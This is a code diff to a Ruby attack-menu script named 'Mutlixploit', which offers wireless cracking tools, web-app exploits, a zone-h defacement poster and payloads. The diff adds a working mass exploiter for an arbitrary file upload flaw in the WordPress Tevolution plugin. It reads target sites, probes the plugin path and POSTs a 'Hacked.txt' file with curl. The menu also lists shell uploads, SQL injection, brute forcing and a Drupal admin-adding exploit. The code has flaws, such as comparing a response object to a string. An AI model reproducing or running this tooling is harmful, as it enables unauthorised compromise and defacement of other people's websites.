@@ -3,28 +3,29 @@
   #first scripte ruby language i hope u like it copyrights:Xhunter Mns
   #please do not change any of scriptes name 
 system "reset"
+require 'colorize'
 puts""  
-puts"[+] Welcome to Mutlixploit v 1.2 [+]"
+puts"[+] Welcome to Mutlixploit v 1.0 [+]".blue
 puts""
-puts"     ##coded by X-Hunter Mns## "
+puts"     ##coded by X-Hunter Mns## ".red
 puts""
 
 puts""
-puts "1) install metasploit 32bit"
+puts "1) install metasploit 32bit".yellow
 puts""
-puts "2) install metasploit 64bit"
+puts "2) install metasploit 64bit".yellow
 puts""
-puts "3) wirless_attack tools"
+puts "3) wirless_attack tools".yellow
 puts""
-puts "4) webapplication attack tools"
+puts "4) webapplication attack tools".yellow
 puts""
-puts "5) scanning tools"
+puts "5) scanning tools".yellow
 puts""
-puts "6) zone-h mass poster"
+puts "6) zone-h mass poster".yellow
 puts ""
-puts "7) payloads"
+puts "7) payloads".yellow
 puts ""
-puts "8) Exit"
+puts "8) Exit".red
 puts ""
 print"select your choice > "
 choice = gets.chomp
@@ -39,17 +40,17 @@ print "" #{choice}
                        elsif choice == "3"
                           then
 puts ""
- puts "3-0 aircrack"
+ puts "3-0 aircrack".green
  puts ""
- puts "3-1) wifite v 1.0"
+ puts "3-1) wifite v 1.0".green
  puts ""
- puts "3-2) fluxion"
+ puts "3-2) fluxion".green
  puts ""
- puts "3-3) ghost phisher"
+ puts "3-3) ghost phisher".green
  puts ""
- puts "3-4) pixiewps"
+ puts "3-4) pixiewps".green
  puts""
- puts"3-5) back <<"
+ puts"3-5) back <<".green
  puts""
  print"select your choice > "
   
@@ -72,21 +73,23 @@ puts ""
  choice == "4" #webapps attack
  then
      puts ""
-     puts "4-0)wordpress revslider mass shell upload"
+     puts "4-0)wordpress revslider mass shell upload".blue
      puts ""
-     puts "4-1)joomla com_mezun sql injection"
+     puts "4-1)joomla com_mezun sql injection".blue
      puts ""
-     puts "4-2)opencart brute force (put your sites in opencart.txt"
+     puts "4-2)opencart brute force (put your sites in opencart.txt)".blue
      puts ""
-     puts "4-3)cms grabber from ip"
+     puts "4-3)cms grabber from ip".blue
      puts ""
-     puts "4-4)Gs bing dorker"
+     puts "4-4)Gs bing dorker".blue
      puts ""
-     puts "4-5)joomla foxcontact shell uploa"
+     puts "4-5)joomla foxcontact shell upload".blue
      puts ""
-     puts "4-6)Drupal exploit add admin"
+     puts "4-6)Drupal exploit add admin".blue
+     puts""
+     puts "4-7)wordpress mass exploiter Slider Templatic Tevolution Arbitrary File Upload".blue
      puts ""
-     puts "4-7)back <<"
+     puts "4-8)back <<".blue
      puts ""
      print "select your choice > "
        
@@ -119,9 +122,43 @@ puts ""
 
                                   elsif
                                     webapplication == "4-6"
-                                     then system ""                 # don't forget this scripte
+                                     then system "" 
+                                  elsif webapplication == "4-7" 
+                                  then
+                                  puts"check if you put the websites in x.txt".yellow
+                                 system 'reset'                                 
+require 'net/http'
+require 'colorize'
+require 'date'
+File.open("x.txt").each do |line| puts line
+
+x = DateTime.now
+x.strftime("%d/%m/%Y %H:%M")
+puts "starting at", x 
+puts""
+url = gets.chomp
+response = nil
+puts"Checking #{url}".blue
+Net::HTTP.start("#{url}", 80) {|http|
+  response = http.head('/wp-content/plugins/Tevolution/tmplconnector/')
+}
+if response == "200"
+  then puts "[Vuln]".green
+else
+  puts"[Not Vuln]".red
+    puts"check path 127.0.0.1/wordpress/ or 127.0.0.1/wp/ ...".yellow
+end
+system "curl -k -X POST -F 'file=@./Hacked.txt' #{url}/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php"
+Net::HTTP.start("#{url}", 80) {|http|
+  response = http.head('wp-content/themes/Directory/images/tmp/Hacked.txt')
+}
+if response == "200"
+  then puts "./Done #{url}/wp-content/themes/Directory/images/tmp/Hacked.txt".green
+else puts "Failed to upload".red
+end
+end             # don't forget this scripte
                                   elsif
-                                    webapplication == "4-7"
+                                    webapplication == "4-8"
                                      then (system "reset") && (system "ruby run.rb")                              
                                    end
 elsif
@@ -131,7 +168,7 @@ elsif
   puts""
   puts"5-2)Scan server From ip"
   puts""
-  puts"5-3)Tn wp scan"
+  puts"5-3)wp scan"
   puts""
   puts"5-4)joomscan"
   puts""
